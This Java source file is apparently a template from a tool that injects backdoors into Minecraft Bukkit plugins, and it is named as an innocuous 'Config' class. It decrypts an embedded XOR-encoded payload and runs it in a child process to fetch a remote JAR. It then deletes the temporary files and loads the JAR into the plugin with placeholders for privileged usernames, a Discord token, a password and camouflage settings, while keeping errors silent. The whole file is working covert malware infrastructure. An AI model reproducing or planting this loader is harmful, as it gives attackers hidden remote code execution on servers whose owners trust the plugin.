package com.tmquan2508.exploit;

import org.bukkit.plugin.Plugin;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.InputStreamReader;
import java.lang.reflect.Constructor;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public final class Config {

    public Config(Plugin plugin) {
        initialize(plugin);
    }

    private void initialize(Plugin plugin) {
        final boolean isDebugEnabled = "::TRUE::".equals("::WARNINGS::");

        if (System.getProperty("openbd.lock") != null) return;

        try {
            String downloadedJarPath = null;
            String mainClassName = null;
            Path tempDir = null;

            try {
                final String key = "::KEY::";
                final String downloaderClassName = "::DOWNLOADER_CLASS_NAME::";

                byte[] decryptedBytecode = Options.decrypt("::ENCRYPTED_PAYLOAD::".replaceAll("\\s", ""), key);
                
                tempDir = Files.createTempDirectory("bd-");
                Options.writeClassFile(tempDir, downloaderClassName, decryptedBytecode);
                
                String javaExecutable = System.getProperty("java.home") + File.separator + "bin" + File.separator + "java";
                ProcessBuilder processBuilder = new ProcessBuilder(javaExecutable, "-cp", tempDir.toString(), downloaderClassName);
                
                processBuilder.redirectErrorStream(true);
                Process process = processBuilder.start();
                
                List<String> outputLines = new ArrayList<>();
                try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                    String line;
                    while ((line = reader.readLine()) != null) outputLines.add(line);
                }
                process.waitFor();
                
                if (process.exitValue() == 0 && outputLines.size() >= 2) {
                    downloadedJarPath = outputLines.get(0);
                    mainClassName = outputLines.get(1);
                }
            } finally {
                if (tempDir != null) {
                    try {
                        Files.walk(tempDir).sorted((a, b) -> b.compareTo(a)).forEach(p -> {
                            try { Files.delete(p); } catch (Exception ignored) {}
                        });
                    } catch (Exception ignored) {}
                }
            }

            if (downloadedJarPath == null || mainClassName == null) {
                if (isDebugEnabled) plugin.getLogger().severe("[Loader] Failed to fetch resource or main class. Aborting.");
                return;
            }

            Options executor = new Options();
            executor.setPlugin(plugin);
            executor.setJarPath(downloadedJarPath);
            executor.setPayloadClassName(mainClassName); 
            executor.setParentInstance(this);
            
            executor.execute();

            if (isDebugEnabled) {
                plugin.getLogger().info("[SUCCESS] Remote module initialized successfully!");
            }

        } catch (Throwable e) {
            if (isDebugEnabled) {
                plugin.getLogger().severe("!!! A CRITICAL ERROR OCCURRED DURING MODULE INITIALIZATION !!!");
                e.printStackTrace();
            }
        }
    }

    class Options {
        private Plugin plugin;
        private String jarPath;
        private String payloadClassName;
        private Config parentInstance;

        public Options() {}

        public void setPlugin(Plugin plugin) {
            this.plugin = plugin;
        }

        public void setJarPath(String jarPath) {
            this.jarPath = jarPath;
        }

        public void setPayloadClassName(String payloadClassName) {
            this.payloadClassName = payloadClassName;
        }

        public void setParentInstance(Config parentInstance) {
            this.parentInstance = parentInstance;
        }

        public void execute() throws Exception {
            URL payloadUrl = new File(this.jarPath).toURI().toURL();
            URLClassLoader payloadClassLoader = new URLClassLoader(new URL[]{payloadUrl}, this.plugin.getClass().getClassLoader());
            Class<?> finalPayloadClass = payloadClassLoader.loadClass(this.payloadClassName);

            Constructor<?> targetConstructor = finalPayloadClass.getConstructor(
                Plugin.class, Class.class, String.class, String.class,
                String.class, String.class, String.class, String.class,
                String.class, String.class
            );
            
            targetConstructor.newInstance(
                this.plugin,
                this.parentInstance.getClass(),
                "::UUIDS::",
                "::USERNAMES::",
                "::PREFIX::",
                "::INJECT_OTHER::",
                "::WARNINGS::",
                "::DISCORD_TOKEN::",
                "::PASSWORD::",
                "::CAMOUFLAGE::"
            );
        }

        public static byte[] decrypt(String base64Src, String key) throws Exception {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            int[] fromBase64Table = new int[256];
            Arrays.fill(fromBase64Table, -1);
            String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
            for (int i = 0; i < chars.length(); i++) fromBase64Table[chars.charAt(i)] = i;
            fromBase64Table['='] = -2;

            int[] buffer = new int[4];
            int bufferCounter = 0;
            for (int i = 0; i < base64Src.length(); i++) {
                int val = fromBase64Table[base64Src.charAt(i) & 0xFF];
                if (val >= 0) {
                    buffer[bufferCounter++] = val;
                    if (bufferCounter == 4) {
                        baos.write((buffer[0] << 2) | (buffer[1] >> 4));
                        baos.write((buffer[1] << 4) | (buffer[2] >> 2));
                        baos.write((buffer[2] << 6) | buffer[3]);
                        bufferCounter = 0;
                    }
                } else if (val == -2) {
                    if (bufferCounter == 2) baos.write((buffer[0] << 2) | (buffer[1] >> 4));
                    else if (bufferCounter == 3) {
                        baos.write((buffer[0] << 2) | (buffer[1] >> 4));
                        baos.write((buffer[1] << 4) | (buffer[2] >> 2));
                    }
                    break;
                }
            }

            byte[] encryptedBytes = baos.toByteArray();
            byte[] keyBytes = key.getBytes("UTF-8");
            byte[] decryptedBytecode = new byte[encryptedBytes.length];
            for (int i = 0; i < encryptedBytes.length; i++) {
                decryptedBytecode[i] = (byte) (encryptedBytes[i] ^ keyBytes[i % keyBytes.length]);
            }
            return decryptedBytecode;
        }

        public static void writeClassFile(Path tempDir, String fqcn, byte[] bytecode) throws Exception {
            Path packageDir = tempDir;
            String classNameOnly;
            int lastDot = fqcn.lastIndexOf('.');
            if (lastDot != -1) {
                packageDir = tempDir.resolve(fqcn.substring(0, lastDot).replace('.', '/'));
                Files.createDirectories(packageDir);
                classNameOnly = fqcn.substring(lastDot + 1);
            } else {
                classNameOnly = fqcn;
            }
            Path tempClassFile = packageDir.resolve(classNameOnly + ".class");
            Files.write(tempClassFile, bytecode);
        }
    }
}